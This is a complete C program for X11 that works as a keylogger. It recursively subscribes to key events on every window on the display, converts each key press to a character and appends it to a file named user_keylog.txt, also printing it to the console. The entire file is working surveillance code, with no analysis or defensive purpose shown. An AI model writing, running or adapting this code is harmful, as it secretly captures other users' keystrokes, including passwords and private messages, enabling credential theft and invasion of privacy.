#include<stdio.h>
#include<stdlib.h>
#include<X11/Xlib.h>
#include<X11/Xutil.h>
#include<X11/Xos.h>

Display *dis;
int screen;
Window win;

// Recursively select every window on the display
void selectWindows(Window curWin) {
  Window parent_return;
  Window root_return;
  Window *children_return;
  int nchildren_return;
  // get all the children of the current window
  XQueryTree(dis, curWin, &root_return, &parent_return, &children_return, &nchildren_return);

  // no children to select anymore
  if (nchildren_return == 0) {
    return;
  }

  // loop through every children and select them for event listening
  for (int i = 0; i < nchildren_return; i++) {
    XSelectInput(dis, *(children_return + i), KeyPressMask|KeyReleaseMask);
    curWin = *(children_return + i);
    selectWindows(curWin);
  }
}

void initx() {
  dis = XOpenDisplay(NULL);
  win = DefaultRootWindow(dis);
  selectWindows(win);
}

int main()
{
  initx();

  // XEvent declaration
  XEvent event;
  // KeySym object for KeyPress events
  KeySym key;
  // character buffer for KeyPress events
  char text[255];

  // looking for event forever
  while(1) {		
    win = DefaultRootWindow(dis);
    selectWindows(win);
    // get the next event
    FILE* fp = fopen("user_keylog.txt", "a");
    XNextEvent(dis, &event);
    // XLookupString converts the KeyPress data into regular text
    if (event.type==KeyPress&&
        XLookupString(&event.xkey,text,255,&key,0)==1) {
      fprintf(fp, "%c", text[0]);
      fprintf(stdout, "%c\n", text[0]);
    }
    fclose(fp);
  }
}
